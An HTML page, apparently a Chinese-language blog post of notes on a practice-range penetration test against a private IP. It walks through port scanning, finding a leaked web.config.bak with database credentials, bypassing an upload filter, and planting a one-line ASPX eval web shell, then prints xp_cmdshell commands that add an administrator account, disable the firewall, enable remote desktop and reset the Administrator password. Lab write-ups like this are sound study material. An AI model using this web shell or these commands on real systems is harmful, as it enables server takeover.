@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>靶场笔记 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="给我一个网址让我去做渗透192.168.2.197以这个IP为例首先判断他是公网地址还是私网地址然后对他进行信息收集这里可以明显判断出来这是一个私网地址所以直接使用nmap进行端口扫描  这里可以看到扫到了两个端口一个是1433一个是27689 1433是sql server的端口  27689是开放端口我们试图访问一下这个端口  可以发现他是一个登陆页面我们使用弱口令万能密码尝试发现进不去这个">
+<meta property="og:type" content="article">
+<meta property="og:title" content="靶场笔记">
+<meta property="og:url" content="http://example.com/2023/08/28/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="给我一个网址让我去做渗透192.168.2.197以这个IP为例首先判断他是公网地址还是私网地址然后对他进行信息收集这里可以明显判断出来这是一个私网地址所以直接使用nmap进行端口扫描  这里可以看到扫到了两个端口一个是1433一个是27689 1433是sql server的端口  27689是开放端口我们试图访问一下这个端口  可以发现他是一个登陆页面我们使用弱口令万能密码尝试发现进不去这个">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828122519457.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828122807495.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828130759008.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828135651156.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828123803932.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828124614350.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828124842548.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828125022295.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828130734041.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828130951731.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828131144055.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828132336357.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828132419096.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828132524075.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828132824129.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828132950120.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828133220269.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828133338906.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828134047283.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828134406447.png">
+<meta property="article:published_time" content="2023-08-28T04:12:41.000Z">
+<meta property="article:modified_time" content="2023-08-28T05:57:01.636Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828122519457.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-靶场笔记" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/08/28/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/" class="article-date">
+  <time class="dt-published" datetime="2023-08-28T04:12:41.000Z" itemprop="datePublished">2023-08-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      靶场笔记
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p> 给我一个网址让我去做渗透192.168.2.197以这个IP为例<br>首先判断他是公网地址还是私网地址然后对他进行信息收集这里可以明显判断出来这是一个私网地址所以直接使用nmap进行端口扫描</p>
+<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828122519457.png" alt="image-20230828122519457"></p>
+<p>这里可以看到扫到了两个端口一个是1433一个是27689</p>
+<p>1433是sql server的端口  27689是开放端口我们试图访问一下这个端口</p>
+<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828122807495.png" alt="image-20230828122807495"></p>
+<p>可以发现他是一个登陆页面我们使用弱口令万能密码尝试发现进不去这个时候我们可以尝试使用kali里面的dir</p>
+<p>dirsearch或者御剑对他进行一个扫描对他的目录进行一个拼接<img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828130759008.png" alt="image-20230828130759008"></p>
+<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828135651156.png" alt="image-20230828135651156"></p>
+<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828123803932.png" alt="image-20230828123803932"></p>
+<p>拼接后的路径依次访问后可以发现拼上web.config.bak这个路径后可以发现自动下载了一个文件</p>
+<p>打开可以发现是一个数据的连接备份我们利用备份的账号和密码连接数据库（之前我们通过扫端口发现还有个1433的端口从而证明数据库类型是sql server）<img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828124614350.png" alt="image-20230828124614350"></p>
+<p>通过对数据库的一番查找发现了账户和密码经过多次尝试以后发现了正确的账号和密码</p>
+<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828124842548.png" alt="image-20230828124842548"></p>
+<p>登陆成功以后发现来到了一个后台管理系统<img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828125022295.png" alt="image-20230828125022295"></p>
+<p>通过我们的一番查找我们找了可以进行文件上传的位置</p>
+<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828130734041.png" alt="image-20230828130734041"></p>
+<p>这里通过查看他的网页后缀能看出来他是以aspx来搭建的我们先试试上传一个aspx文件试试</p>
+<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828130951731.png" alt="image-20230828130951731"></p>
+<p>发现被拒接了我们尝试往前面翻看看他前面的文件是什么情况</p>
+<p>我们通过翻记录发现他最多识别32位我们可以利用这个点对文件进行上传</p>
+<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828131144055.png" alt="image-20230828131144055"></p>
+<p>我写了一句话木马写入到一个txt文件并对他进行上传，上传的同时打开burp对网页进行抓包在抓到的包里面对文件进行修改通过查看上传的文件可以发现上传成功以后会自动给文件前面加上19个字符所以我们上传时要计算好字符位  </p>
+<blockquote>
+<p>木马： &lt;%@ Page Language&#x3D;”Jscript”%&gt;&lt;%eval(Request.Item[“123”],”unsafe”);%&gt;</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828132336357.png" alt="image-20230828132336357"></p>
+<p>抓包修改完成后放包</p>
+<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828132419096.png" alt="image-20230828132419096"></p>
+<p>页面显示上传成功</p>
+<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828132524075.png" alt="image-20230828132524075"></p>
+<p>可以看到刚刚上传的文件接下来就是拼接路径</p>
+<p>我们通过访问第一个文件可以看到系统存放的物理路径我们对这个物理路径进行一个拼接</p>
+<p>最后验证出正确的路径         \upfile\affix<img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828132824129.png" alt="image-20230828132824129"></p>
+<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828132950120.png" alt="image-20230828132950120"></p>
+<p>我能够成功访问</p>
+<p>这个时候打开中国蚁剑进行一个连接</p>
+<p>复制刚刚打开的网站路径复制进蚁剑</p>
+<p>然后输入密码</p>
+<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828133220269.png" alt="image-20230828133220269"></p>
+<p>成功连接</p>
+<p>翻看主机的文件</p>
+<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828133338906.png" alt="image-20230828133338906"></p>
+<p>又翻到一个数据库的备份文件</p>
+<p>尝试连接发现能够直接成功</p>
+<p>发现连接的第二个用户权限似乎更高直接在数据库里面进行写入</p>
+<p>修改管理员密码并且开启远程连接关闭防火墙</p>
+<p>USE master<br>RECONFIGURE<br>EXEC sp_configure ‘show advanced options’,1<br>RECONFIGURE<br>EXEC sp_configure ‘xp_cmdshell’,1<br>exec master..xp_cmdshell ‘net user admin 123 &#x2F;add’<br>exec master..xp_cmdshell ‘net localgroup administrators admin &#x2F;add’<br>exec master..xp_cmdshell ‘netsh firewall set opmode disable’<br>exec master..xp_cmdshell ‘REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f’<br>exec master..xp_cmdshell ‘netstat -anop tcp | find “3389”‘</p>
+<p>要是实在不行就使用</p>
+<p>USE master<br>RECONFIGURE<br>EXEC sp_configure ‘show advanced options’,1<br>RECONFIGURE<br>EXEC sp_configure ‘xp_cmdshell’,1<br>exec master..xp_cmdshell ‘net user Administrator   123’</p>
+<p>直接修改管理员密码</p>
+<p>修改完成后使用远程桌面连接</p>
+<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828134047283.png" alt="image-20230828134047283"></p>
+<p><img src="https://raw.githubusercontent.com/lonelywenjie/image/main/img/image-20230828134406447.png" alt="image-20230828134406447"></p>
+<p>成功连接完成渗透</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/08/28/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/" data-id="clopmhmik000hr8vc2cdncj4m" data-title="靶场笔记" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/09/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          文件上传
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2023/08/10/xss/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">xss</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 10px;">安全</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/11/08/test-my-site/">test_my_site</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/08/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2023/09/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/28/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/">靶场笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/10/xss/">xss</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
